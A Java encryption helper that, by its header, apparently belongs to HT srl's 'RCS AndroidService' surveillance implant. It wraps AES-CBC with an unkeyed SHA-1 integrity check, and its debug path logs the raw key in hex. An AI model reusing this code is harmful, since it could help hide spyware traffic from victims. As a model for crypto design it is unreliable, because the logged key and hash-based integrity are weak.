/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EncryptionPKCS5.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.crypto;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import com.android.networking.auto.Cfg;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class EncryptionPKCS5.
 */
public class EncryptionPKCS5 {

	private CryptoCBC crypto;

	public EncryptionPKCS5() {

	}

	public EncryptionPKCS5(final byte[] key) {

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (EncryptionPKCS5): " + ByteArray.byteArrayToHex(key));
			}
			init(key);
		} catch (CryptoException e) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (EncryptionPKCS5) Error: " + e);
			}

		}
	}

	/**
	 * Instantiates a new encryption pkc s5.
	 * 
	 * @param key
	 *            the key
	 * @throws CryptoException
	 * @throws NoSuchPaddingException
	 * @throws NoSuchAlgorithmException
	 */
	public void init(final byte[] key) throws CryptoException {
		try {
			crypto = new CryptoCBC(key);
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (init) Error: " + e);
			}
			throw new CryptoException();
		}
	}

	/** The Constant DIGEST_LENGTH. */
	private static final int DIGEST_LENGTH = 20;
	/** The debug. */
	private static final String TAG = "EncryptionPKCS5"; //$NON-NLS-1$

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Encryption#decryptData(byte[], int,
	 * int)
	 */

	public byte[] decryptData(final byte[] cyphered, final int offset, final long enclen) throws CryptoException {

		if (Cfg.DEBUG) {
			Check.requires(enclen > 0 && enclen <= cyphered.length, " (decryptData) Assert failed, enclen: " + enclen);
			Check.requires(offset >= 0 && offset < cyphered.length, " (decryptData) Assert failed, offset: " + offset);
			Check.requires(cyphered.length >= offset + enclen, " (decryptData) Assert failed, cyphered.length: "
					+ cyphered.length);
		}
		// int padlen = cyphered[cyphered.length -1];
		// int plainlen = enclen - padlen;
		if (Cfg.DEBUG) {
			Check.requires(enclen % 16 == 0, "Wrong padding"); //$NON-NLS-1$
		}

		byte[] plain;
		try {
			plain = crypto.decrypt(cyphered, offset, enclen);
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (decryptData) Error: " + e);
			}
			throw new CryptoException();
		}
		return plain;
	}

	/**
	 * Encrypt data integrity.
	 * 
	 * @param plain
	 *            the plain
	 * @return the byte[]
	 */
	public byte[] encryptDataIntegrity(final byte[] plain) {

		final byte[] sha = Digest.SHA1(plain);
		final byte[] plainSha = Utils.concat(plain, sha);
		if (Cfg.DEBUG) {
			Check.asserts(sha.length == DIGEST_LENGTH, "sha.length"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.asserts(plainSha.length == plain.length + DIGEST_LENGTH, "plainSha.length"); //$NON-NLS-1$
		}
		try {
			return crypto.encrypt(plainSha);
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (encryptDataIntegrity) Error: " + e);
			}
			return null;
		}
	}

	/**
	 * Decrypt data integrity.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @return the byte[]
	 * @throws CryptoException
	 *             the crypto exception
	 */
	public byte[] decryptDataIntegrity(final byte[] cyphered) throws CryptoException {
		byte[] plainSha;
		try {
			plainSha = crypto.decrypt(cyphered, 0, cyphered.length);
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (decryptDataIntegrity) Error: " + e);
			}
			return null;
		}
		final byte[] plain = ByteArray.copy(plainSha, 0, plainSha.length - DIGEST_LENGTH);
		final byte[] sha = ByteArray.copy(plainSha, plainSha.length - DIGEST_LENGTH, DIGEST_LENGTH);
		final byte[] calculatedSha = Digest.SHA1(plainSha, 0, plainSha.length - DIGEST_LENGTH);
		// if(Cfg.DEBUG) Check.asserts(SHA1Digest.DIGEST_LENGTH == 20, //$NON-NLS-1$
		// "DIGEST_LENGTH");
		if (Cfg.DEBUG) {
			Check.asserts(plain.length + DIGEST_LENGTH == plainSha.length, "plain.length"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.asserts(sha.length == DIGEST_LENGTH, "sha.length"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.asserts(calculatedSha.length == DIGEST_LENGTH, "calculatedSha.length"); //$NON-NLS-1$
		}
		if (Arrays.equals(calculatedSha, sha)) {
			return plain;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: decryptDataIntegrity: sha error!");//$NON-NLS-1$
			}
			throw new CryptoException();
		}
	}

	public byte[] decryptData(byte[] cypher) throws CryptoException {
		return decryptData(cypher, 0, cypher.length);
	}

	public byte[] encryptData(byte[] clear) throws CryptoException {
		
		try {
			return crypto.encrypt(clear);
		} catch (InvalidKeyException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (encryptData) Error: " + e);
			}
		} catch (InvalidAlgorithmParameterException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (encryptData) Error: " + e);
			}
		} catch (IllegalBlockSizeException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (encryptData) Error: " + e);
			}
		} catch (BadPaddingException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (encryptData) Error: " + e);
			}
		}
		
		throw new CryptoException();
	}

}
